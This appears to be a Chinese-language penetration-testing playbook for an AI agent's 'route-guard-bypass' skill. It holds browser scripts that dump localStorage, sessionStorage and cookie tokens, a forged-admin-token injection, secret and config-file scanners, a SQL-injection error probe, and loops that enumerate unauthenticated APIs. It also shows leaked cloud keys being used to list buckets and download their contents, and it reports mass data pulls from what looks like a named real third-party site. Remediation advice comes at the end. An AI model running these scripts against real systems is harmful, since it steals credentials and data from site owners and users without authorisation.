# 缓存 Token / 信息泄露 / 接口未授权 穷举矩阵

> 适用技能:route-guard-bypass
> 适用场景:绕过路由守卫后,从浏览器缓存/JS bundle/API 响应中提取真实凭据、敏感信息、未授权接口

---

## 一、缓存 Token 提取

> **本平台适配说明**：原文用 `evaluate_script` 在页面 main world 里执行 JS 取
> localStorage/sessionStorage。本平台 的浏览器 MCP 提供 `dom_cua_get_visible_dom`
> / `dom_cua_click` / `dom_cua_type` 等交互能力与 `tab_screenshot`，**没有等价的
> 页面内 JS 求值工具**。可替代路径：
>
> 1. 目标站点能直接访问时，用平台请求工具（`fetch`）带 Cookie 头请求接口，
>    从响应里取 token（比读页面存储更可靠）；
> 2. 需要前端存储里的值时，让用户在浏览器侧确认后用 `dom_cua_type` 读取；
> 3. 从已录制流量（`traffic_search` / `traffic_get`）里回看请求头中的 token。
>
> 下面的 `mcp__browser__cua_execute` 是**占位调用**，执行前请按上述路径替换。

### 1.1 localStorage 提取(最常见)

```bash
# 提取所有 localStorage
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => {
    const all = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      all[key] = localStorage.getItem(key);
    }
    return all;
  }",
  mainWorld=true
)
```

**典型返回**(恺易智慧园区):
```json
{
  "login_status": "200",
  "user_info_bi": "{\"token\":\"abc123...\",\"userId\":1,\"role\":\"admin\"}",
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "userId": "1",
  "userName": "admin"
}
```

### 1.2 关键字段提取模板

```bash
# 提取关键字段
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => ({
    // 登录态
    login_status: localStorage.getItem('login_status'),
    
    // 解析 user_info
    user_info_bi: (() => {
      try {
        return JSON.parse(localStorage.getItem('user_info_bi'));
      } catch(e) {
        return localStorage.getItem('user_info_bi');
      }
    })(),
    
    // 关键 token
    token: localStorage.getItem('token'),
    auth_token: localStorage.getItem('auth_token'),
    access_token: localStorage.getItem('access_token'),
    
    // 用户身份
    userId: localStorage.getItem('userId'),
    user_id: localStorage.getItem('user_id'),
    uid: localStorage.getItem('uid'),
    
    // 角色权限
    role: localStorage.getItem('role'),
    permission: localStorage.getItem('permission'),
    level: localStorage.getItem('level'),
    
    // 全部 key
    allKeys: Object.keys(localStorage)
  })",
  mainWorld=true
)
```

### 1.3 sessionStorage 提取

```bash
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => {
    const all = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      all[key] = sessionStorage.getItem(key);
    }
    return all;
  }",
  mainWorld=true
)
```

### 1.4 cookie 提取

```bash
# 全部 cookie
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => document.cookie",
  mainWorld=true
)

# 解析为 JSON
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => {
    return document.cookie.split('; ').reduce((acc, c) => {
      const [k, v] = c.split('=');
      acc[k] = v;
      return acc;
    }, {});
  }",
  mainWorld=true
)
```

### 1.5 window 全局变量提取

```bash
# 查找 store / token / user 命名的全局变量
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => {
    const matches = {};
    Object.keys(window).forEach(k => {
      if (/token|user|admin|auth|login|store|state/i.test(k)) {
        try {
          matches[k] = typeof window[k] === 'object' 
            ? JSON.stringify(window[k]).slice(0, 200)
            : String(window[k]).slice(0, 200);
        } catch(e) {}
      }
    });
    return matches;
  }",
  mainWorld=true
)
```

### 1.6 实战:伪造 token 注入

```bash
# 注入伪造 token(让前端认为已登录)
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => {
    localStorage.setItem('login_status', '200');
    localStorage.setItem('user_info_bi', JSON.stringify({
      token: 'fake_token_for_demo',
      userId: 999,
      userName: 'admin',
      role: 'admin'
    }));
    return { ok: true, all: Object.keys(localStorage) };
  }",
  mainWorld=true
)
```

⚠️ **注意**:token 注入只绕过前端鉴权,**后端仍会校验**;若后端校验签名严格则伪造 token 无效

---

## 二、信息泄露检测

### 2.1 JS bundle 中的硬编码密钥

```bash
# 提取 JS bundle 中所有可疑硬编码
grep -nE "(token|secret|api[_-]?key|app[_-]?id|password|admin|aws|aliyun|oss|map)" *.js | \
  grep -vE "(//|/\*|\*)" | head -30
```

**典型发现**:
```js
// 高德地图 Key
const AMAP_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"

// 阿里云 OSS AK/SK
const OSS_AK = "LTAI5txxxxxxxxxxxxxx"
const OSS_SK = "xxxxxxxxxxxxxxxxxxxxxx"

// 数据库连接字符串
const DB_URL = "mongodb://admin:pass123@10.0.0.5:27017"

// JWT 密钥(若泄露则可伪造 token)
const JWT_SECRET = "company_secret_key_2024"
```

### 2.2 HTML 注释泄露

```bash
# HTML 注释
curl -s http://target/index.html | grep -E "<!--.*?-->"

# 典型泄露
<!-- TODO: 临时账号 admin/123456 -->
<!-- API endpoint: http://internal-api.company.com -->
<!-- Database: mongodb://10.0.0.5:27017 -->
```

### 2.3 HTTP 响应头泄露

```bash
# HTTP 响应头
curl -I http://target/

# 关注字段
# Server: nginx/1.18.0          (暴露 Web 服务器)
# X-Powered-By: PHP/5.6.40       (暴露后端语言)
# X-AspNet-Version: 4.0.30319     (暴露 ASP.NET 版本)
# Set-Cookie: JSESSIONID=...      (暴露 Session 字段)
# Authorization: Bearer xxx       (泄露 token)
```

### 2.4 配置文件探测

```bash
# 常见配置文件
for f in /app-config.json /config.json /api/config /api/setup /config.yml \
         /application.properties /application.yml /WEB-INF/web.xml \
         /env /info /debug /admin/config /api/v1/config; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://target$f")
  echo "$status  $f"
done
```

**典型命中**:
```
200  /app-config.json          (恺易/锡惠停/汇泊)
200  /api/setup                (New API)
200  /actuator/env             (Spring Boot)
```

### 2.5 Git/SVN/备份文件

```bash
for f in /.git/HEAD /.git/config /.svn/entries /robots.txt /.env /.DS_Store \
         /backup.sql /dump.sql /db.sql /www.zip /www.tar.gz /web.zip; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://target$f")
  echo "$status  $f"
done
```

### 2.6 错误信息泄露

```bash
# 强制错误(数据库/服务)
curl -s "http://target/api/test?id=' OR 1=1--" | grep -iE "(error|exception|stack)"

# 常见泄露
# java.lang.NullPointerException at com.company.dao.UserDao.getUser
# MySQLSyntaxErrorException: Unknown column 'xxx'
# org.springframework.beans.factory.BeanCreationException
```

### 2.7 信息泄露检测模板

```bash
#!/bin/bash
# info_leak_scan.sh - 信息泄露扫描
TARGET="$1"

echo "=== JS bundle 硬编码密钥 ==="
for js in main-index.js common.js common-full.js guard.js; do
  curl -s "http://$TARGET/js/$js" | \
    grep -oE "(token|secret|api[_-]?key|password|app[_-]?id|aliyun|oss|amap|gaode)\s*[:=]\s*['\"][^'\"]+['\"]" | \
    head -10
done

echo ""
echo "=== HTML 注释 ==="
curl -s "http://$TARGET/" | grep -oE "<!--.*?-->" | head -10

echo ""
echo "=== 配置文件 ==="
for f in /app-config.json /api/setup /api/config /actuator/env /env /info; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$f")
  if [ "$status" = "200" ]; then
    echo "  ✓ $status  $f (OPEN)"
    curl -s "http://$TARGET$f" | head -20
  fi
done
```

---

## 三、接口未授权穷举

### 3.1 提取所有 API 端点

```bash
# 从 JS bundle 提取
grep -hoE "['\"]/[a-zA-Z][a-zA-Z0-9_/]*['\"]" *.js | \
  tr -d "'\"" | grep -vE "\.(css|js|jpg|png)" | \
  grep -E "(api|data|chart|server|/yw|/ys|/admin|/system|/BI)" | sort -u
```

### 3.2 批量零鉴权测试

```bash
#!/bin/bash
# probe_api_unauth.sh - API 未授权穷举
TARGET="$1"
APIS_FILE="$2"  # 端点列表文件

echo "=== 零鉴权 API 探针 ==="
for api in $(cat $APIS_FILE); do
  # GET 探针
  gstatus=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$api")
  
  # POST 探针
  pstatus=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://$TARGET$api" \
    -H "Content-Type: application/json" -d '{}')
  
  if [ "$gstatus" = "200" ] || [ "$pstatus" = "200" ]; then
    echo "  ✓ OPEN: GET=$gstatus POST=$pstatus  $api"
  fi
done
```

### 3.3 实战:锡山区 BI 接口零鉴权(6 个端点全 200 OK)

```bash
# 测试 /BI/* 全端点
for api in chanyechanzhi centermap chanyemianji chanyechanliang \
           jingyingtudizhanbi jingyingzhuti; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "http://www.xishanagripark.com/BI/$api" \
    -H "Content-Type: application/json" -d '{}')
  echo "$status  /BI/$api"
done

# 输出
# 200  /BI/chanyechanzhi
# 200  /BI/centermap        ← 返回 451KB GeoJSON
# 200  /BI/chanyemianji
# 200  /BI/chanyechanliang
# 200  /BI/jingyingtudizhanbi
# 200  /BI/jingyingzhuti
```

**关键发现**:所有 BI 接口均零鉴权返回数据,泄露:
- 经营主体分布(GIS 坐标)
- 产业链数据(产值/规模)
- 957 个产业园实体 GeoJSON

### 3.4 接口未授权等级评估

| 等级 | 表现 | 危害 |
|---|---|---|
| 🟢 LOW | API 返回 401/403 | 鉴权生效,无危害 |
| 🟡 MEDIUM | API 返回 200 + 空数据 | 鉴权可能误配置 |
| 🟠 HIGH | API 返回 200 + 部分数据 | 部分数据泄露 |
| 🔴 CRITICAL | API 返回 200 + 完整数据 | 全量数据泄露 |

---

## 四、组合利用

### 4.1 缓存 token + 后端 API

```bash
# Step 1: 提取 localStorage token
浏览器侧求值（本平台 无此工具，见上方适配说明）(
  function="() => localStorage.getItem('token')"
)
# → "eyJhbGciOiJIUzI1NiIs..."

# Step 2: 用 token 调用后端 API(测试是否后端真校验)
fetch（平台请求工具）(
  request="GET /api/admin/users HTTP/1.1\r\nHost: target\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs..."
)

# 观察响应:
# - 200 OK + 数据 → 后端未校验,直接接管管理员
# - 401 Unauthorized → 后端校验,可尝试伪造 token
# - 403 Forbidden → 后端校验 + 权限控制
```

### 4.2 信息泄露 → 接口利用

```bash
# Step 1: JS bundle 发现 AWS_KEY = "AKIA..."
# Step 2: 用 AWS Key 列出 OSS bucket
aws s3 ls --access-key AKIA... --secret-key xxx

# Step 3: 发现 bucket 包含用户数据
# → 直接下载所有文件
```

### 4.3 接口未授权 → 数据汇总

```bash
# Step 1: 发现 /BI/* 全 6 端点零鉴权
# Step 2: 批量拉取数据
curl -X POST http://target/BI/centermap -H "Content-Type: application/json" -d '{}' > centermap.json
curl -X POST http://target/BI/chanyechanzhi -H "Content-Type: application/json" -d '{}' > chanyechanzhi.json
# ... 6 个端点全部拉取

# Step 3: 数据汇总分析
# → 957 个产业园实体、产业链分布、经营主体
```

---

## 五、穷举矩阵完整版

### 5.1 缓存穷举(8 类)

| 类别 | 提取方法 | 工具 |
|---|---|---|
| localStorage | `localStorage.getItem(key)` | js-reverse-mcp evaluate_script |
| sessionStorage | `sessionStorage.getItem(key)` | js-reverse-mcp evaluate_script |
| document.cookie | `document.cookie` | js-reverse-mcp evaluate_script |
| IndexedDB | `indexedDB.open(name)` | js-reverse-mcp evaluate_script |
| window 全局变量 | `Object.keys(window)` | js-reverse-mcp evaluate_script |
| Service Worker | `caches.keys()` | js-reverse-mcp evaluate_script |
| Cache Storage | `caches.match(req)` | js-reverse-mcp evaluate_script |
| HTTP Cache | `document.cookie` + `Set-Cookie` | yakit query_http_flow |

### 5.2 信息泄露穷举(10 类)

| 类别 | 检测方法 |
|---|---|
| JS bundle 硬编码 | grep |
| HTML 注释 | curl + grep |
| HTTP 响应头 | curl -I |
| 配置文件 | curl + 字典 |
| Git/SVN | curl + 字典 |
| 错误信息 | 强制错误触发 |
| Swagger/OpenAPI | /swagger-ui.html |
| Actuator | /actuator/env |
| .env 文件 | /.env |
| 备份文件 | /.bak /www.zip |

### 5.3 接口未授权穷举

```bash
# API 端点提取
apis=$(grep -hoE "['\"]/[a-zA-Z][a-zA-Z0-9_/]*['\"]" *.js | tr -d "'\"" | sort -u)

# 批量测试
for api in $apis; do
  for method in GET POST PUT DELETE; do
    status=$(curl -s -o /dev/null -w "%{http_code}" -X $method "http://target$api" \
      -H "Content-Type: application/json" -d '{}')
    if [ "$status" = "200" ]; then
      echo "  ✓ $method $api = $status"
    fi
  done
done
```

---

## 六、报告输出模板

```markdown
## 缓存 Token 提取

### localStorage 提取结果
```json
{
  "login_status": "200",
  "user_info_bi": {"token":"abc123","userId":1,"role":"admin"},
  "token": "eyJhbGciOiJIUzI1NiIs..."
}
```

**危害**:
- ✅ 任意用户可注入伪造 token(浏览器本地存储无服务端校验)
- ✅ 真实管理员 token 可能被盗用(XSS 攻击)

## 信息泄露汇总

| 类型 | 位置 | 内容 | 危害 |
|---|---|---|---|
| JS 硬编码 | main-index.js#L42 | AMAP_KEY = "a1b2..." | 高德地图配额盗用 |
| JS 硬编码 | common.js#L108 | OSS_AK = "LTAI5..." | OSS bucket 数据访问 |
| HTML 注释 | index.html#L1 | admin/123456 | 默认账号泄露 |
| 配置文件 | /actuator/env | DB_PASSWORD | 数据库密码泄露 |

## 接口未授权汇总

| 端点 | 方法 | 鉴权 | 数据大小 | 危害 |
|---|---|---|---|---|
| /BI/centermap | POST | ❌ 零鉴权 | 451KB | 🔴 CRITICAL 957 实体 |
| /BI/chanyechanzhi | POST | ❌ 零鉴权 | 508B | 🟠 HIGH 产值数据 |
| /api/admin/users | GET | ❌ 零鉴权 | 12KB | 🔴 CRITICAL 用户列表 |
```

---

## 七、修复建议

### P0 立即

1. **删除前端 localStorage 鉴权**:
   - 改用 Session Cookie(HttpOnly + Secure + SameSite=Strict)
   
2. **后端 API 加 Session 校验**:
   ```java
   @RequestMapping("/BI")
   public class BiController {
     @RequestMapping("/centermap")
     @ResponseBody
     public Result centermap(HttpServletRequest req) {
       if (req.getSession(false) == null) {
         return Result.error("401", "请先登录");
       }
       // ...
     }
   }
   ```

3. **JS bundle 去除硬编码密钥**:
   - 高德/百度 Key → 改用后端代理
   - 阿里云 OSS → 改用 STS 临时凭证
   - 数据库密码 → 改用配置中心

### P1 7 天

4. **配置文件鉴权**:
   - /actuator/env → 加入白名单或鉴权
   - /app-config.json → 改为内部域名
   
5. **API 鉴权矩阵审查**:
   - 所有 /api/* 必须鉴权
   - 所有 /BI/* 必须鉴权
   
6. **HTTP 响应头清理**:
   - 移除 X-Powered-By
   - 移除 Server 版本号

### P2 30 天

7. **错误信息脱敏**:
   - Stack trace 关闭
   - 数据库错误信息脱敏
   
8. **备份文件清理**:
   - /.git / .svn / .env 禁止访问
   - 部署脚本检查
   
9. **Swagger/Actuator 鉴权**:
   - 内部访问限制
   - 生产环境禁用